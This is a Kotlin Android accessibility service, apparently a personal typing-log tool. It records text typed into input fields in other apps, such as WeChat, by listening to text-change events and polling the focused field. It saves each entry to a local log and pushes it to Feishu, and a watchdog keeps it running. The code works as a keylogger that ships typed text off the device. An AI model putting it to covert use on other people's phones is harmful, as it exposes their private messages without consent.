package dev.local.typinglog

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.BroadcastReceiver
import android.content.ComponentCallbacks2
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONObject
import java.io.File
import java.util.concurrent.Executors

/**
 * 记录“上屏文字”。
 *
 * 主路径：输入框发出 TYPE_VIEW_TEXT_CHANGED，事件里带完整文本。
 * 兜底：事件没带节点、或干脆没发事件时，定期读当前焦点输入框（3 秒一次，仅亮屏）。
 * 心跳：每 5 分钟落一次时间并 flush，日志页能看到服务是否还活着。
 *
 * 拿不到的东西：拼音串、候选词、被删掉的中间过程、密码框内容。
 */
class TypingLogService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())
    private val debugWriter = Executors.newSingleThreadExecutor()

    /** key = 包名 + 窗口 id */
    private val pending = HashMap<String, Pending>()
    private val lastCommitted = HashMap<String, Pair<String, Long>>()
    private val labels = HashMap<String, String>()
    private val lastPolled = HashMap<String, String>()

    private var polling = false
    private var screenOn = true

    /** 屏幕熄灭先落盘；亮屏再恢复兜底轮询。 */
    private val screenReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                Intent.ACTION_SCREEN_OFF -> {
                    screenOn = false
                    stopPolling()
                    flushAll()
                    beat()
                }
                Intent.ACTION_SCREEN_ON -> {
                    screenOn = true
                    startPolling()
                }
            }
        }
    }

    /** 兜底轮询：只在亮屏时跑，读焦点输入框的文本。 */
    private val pollRunnable = object : Runnable {
        override fun run() {
            try {
                pollFocusedInput()
            } catch (_: Throwable) {
            }
            if (polling) handler.postDelayed(this, POLL_MS)
        }
    }

    /** 心跳：每 5 分钟落一次时间、推送飞书，顺便把待写内容写掉。 */
    private val heartbeatRunnable = object : Runnable {
        override fun run() {
            try {
                flushAll()
                beat()
                FeishuPusher.heartbeat(this@TypingLogService)
            } catch (_: Throwable) {
            }
            handler.postDelayed(this, HEARTBEAT_MS)
        }
    }

    private inner class Pending(
        val pkg: String,
        var text: String,
        var ts: Long
    ) {
        var task: Runnable? = null
    }

    private val prefs: SharedPreferences
        get() = getSharedPreferences(Keys.PREFS, MODE_PRIVATE)

    override fun onServiceConnected() {
        super.onServiceConnected()
        serviceInfo = serviceInfo?.apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 50
        }
        try {
            registerReceiver(
                screenReceiver,
                IntentFilter().apply {
                    addAction(Intent.ACTION_SCREEN_OFF)
                    addAction(Intent.ACTION_SCREEN_ON)
                }
            )
        } catch (_: Exception) {
        }

        beat()
        handler.removeCallbacks(heartbeatRunnable)
        handler.postDelayed(heartbeatRunnable, HEARTBEAT_MS)
        startPolling()
        Watchdog.schedule(this)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // 单次事件里的任何异常都不应该让服务挂掉
        try {
            handleEvent(event)
        } catch (_: Throwable) {
        }
    }

    private fun handleEvent(event: AccessibilityEvent?) {
        event ?: return
        if (!prefs.getBoolean(Keys.ENABLED, true)) {
            pending.clear()
            return
        }
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                if (prefs.getBoolean(Keys.DEBUG_EVENTS, false)) recordDebugEvent(event)
                handleTextChanged(event)
            }
            // 切页面时顺手看一眼焦点，补上“进页面但没发文本事件”的情况
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> pollFocusedInput()
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        val node = event.source
        if (node == null) {
            // 兜底：事件没带节点，直接读焦点输入框
            pollFocusedInput()
            return
        }
        try {
            if (event.isPassword || node.isPassword) return

            val pkg = event.packageName?.toString() ?: return
            if (pkg == packageName) return

            // 事件里的 text 有时是空的（例如微信自定义输入框），退回读节点文本
            var text = event.text?.joinToString("") ?: ""
            if (text.isEmpty()) {
                text = node.text?.toString() ?: ""
            }

            // 微信组词/上屏事件会给出 cls 为空、editable=false 但 eventText 有内容的事件，
            // 只要求「可编辑或带文本」二者之一，避免把这类输入漏掉。
            if (!isEditable(node) && text.isEmpty()) return

            feed(pkg, event.windowId, text, fromEvent = true)
        } finally {
            node.recycle()
        }
    }

    /** 读当前焦点输入框；和事件路径共用同一套聚合，避免重复。 */
    private fun pollFocusedInput() {
        if (!screenOn) return
        if (!prefs.getBoolean(Keys.ENABLED, true)) return

        val root = rootInActiveWindow ?: return
        try {
            val node = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: return
            try {
                if (node.isPassword) return
                val pkg = node.packageName?.toString() ?: return
                if (pkg == packageName) return

                val text = node.text?.toString().orEmpty()
                if (text.isEmpty()) return

                val key = pkg + "#" + node.windowId
                if (lastPolled[key] == text) return
                lastPolled[key] = text

                // 事件路径已经收到同样的内容，就不要重复喂
                if (pending[key]?.text == text) return

                feed(pkg, node.windowId, text, fromEvent = false)
            } finally {
                node.recycle()
            }
        } catch (_: Exception) {
        } finally {
            root.recycle()
        }
    }

    private fun feed(pkg: String, windowId: Int, text: String, fromEvent: Boolean) {
        val key = pkg + "#" + windowId
        val now = System.currentTimeMillis()

        // 隔了很久才继续输入，先把上一段落下
        val old = pending[key]
        if (old != null && now - old.ts > SESSION_GAP_MS) flush(key)

        if (text.isBlank()) {
            // 输入框被清空：多半是点了发送，马上落盘
            val p = pending.remove(key)
            if (p != null) {
                p.task?.let { handler.removeCallbacks(it) }
                if (p.text.isNotBlank()) commit(p.pkg, p.text)
            }
            return
        }

        val p = pending.getOrPut(key) { Pending(pkg, text, now) }
        p.text = text
        p.ts = now
        p.task?.let { handler.removeCallbacks(it) }
        val task = Runnable { flush(key) }
        p.task = task
        handler.postDelayed(task, IDLE_MS)

        if (!fromEvent) lastPolled[key] = text
    }

    private fun isEditable(node: AccessibilityNodeInfo): Boolean {
        if (node.isEditable) return true
        val cls = node.className?.toString() ?: return false
        return cls.contains("EditText") || cls.contains("TextInputEditText")
    }

    private fun flush(key: String) {
        val p = pending.remove(key) ?: return
        p.task?.let { handler.removeCallbacks(it) }
        if (p.text.isNotBlank()) commit(p.pkg, p.text)
    }

    private fun flushAll() {
        pending.keys.toList().forEach { flush(it) }
    }

    private fun commit(pkg: String, raw: String) {
        val text = raw.trim()
        if (text.isEmpty()) return

        val now = System.currentTimeMillis()
        val last = lastCommitted[pkg]
        if (last != null && last.first == text && now - last.second < DEDUPE_MS) return
        lastCommitted[pkg] = text to now

        val app = labelOf(pkg)
        val record = Record(now, pkg, app, text)

        // 同步落盘：写完才返回，进程随后被杀也不会丢这一条
        try {
            LogStore.append(this, record)
        } catch (_: Exception) {
        }

        // 推送失败不影响本地记录
        try {
            FeishuPusher.submit(this, record)
        } catch (_: Exception) {
        }
    }

    private fun labelOf(pkg: String): String {
        labels[pkg]?.let { return it }
        val label = try {
            val pm = packageManager
            pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
        } catch (_: Exception) {
            pkg
        }
        labels[pkg] = label
        return label
    }

    /** 把原始事件写进 debug/events.jsonl，用来判断是“没事件”还是“被过滤”。 */
    private fun recordDebugEvent(event: AccessibilityEvent) {
        val node = event.source
        try {
            val eventText = event.text?.joinToString("").orEmpty()
            val nodeText = node?.text?.toString().orEmpty()
            val line = JSONObject()
                .put("t", System.currentTimeMillis())
                .put("pkg", event.packageName?.toString().orEmpty())
                .put("cls", node?.className?.toString().orEmpty())
                .put("editable", node?.isEditable ?: false)
                .put("password", event.isPassword || (node?.isPassword ?: false))
                .put("eventText", eventText.take(200))
                .put("nodeText", nodeText.take(200))
                .toString()

            val dir = File(filesDir, "debug").apply { mkdirs() }
            val file = File(dir, "events.jsonl")
            if (file.length() > 2 * 1024 * 1024) file.delete()
            debugWriter.execute {
                try {
                    file.appendText(line + "\n", Charsets.UTF_8)
                } catch (_: Exception) {
                }
            }
        } catch (_: Exception) {
        } finally {
            node?.recycle()
        }
    }

    private fun beat() {
        prefs.edit().putLong(Keys.HEARTBEAT_AT, System.currentTimeMillis()).apply()
    }

    private fun startPolling() {
        if (polling || !screenOn) return
        polling = true
        handler.postDelayed(pollRunnable, POLL_MS)
    }

    private fun stopPolling() {
        polling = false
        handler.removeCallbacks(pollRunnable)
    }

    override fun onInterrupt() {
        flushAll()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        flushAll()
        super.onTaskRemoved(rootIntent)
    }

    override fun onTrimMemory(level: Int) {
        if (level >= ComponentCallbacks2.TRIM_MEMORY_RUNNING_LOW) flushAll()
        super.onTrimMemory(level)
    }

    override fun onLowMemory() {
        flushAll()
        super.onLowMemory()
    }

    override fun onDestroy() {
        stopPolling()
        handler.removeCallbacks(heartbeatRunnable)
        flushAll()
        try {
            unregisterReceiver(screenReceiver)
        } catch (_: Exception) {
        }
        debugWriter.shutdown()
        super.onDestroy()
    }

    companion object {
        private const val IDLE_MS = 800L
        private const val SESSION_GAP_MS = 5 * 60 * 1000L
        private const val DEDUPE_MS = 3_000L
        private const val POLL_MS = 3_000L
        private const val HEARTBEAT_MS = 5 * 60 * 1000L
    }
}
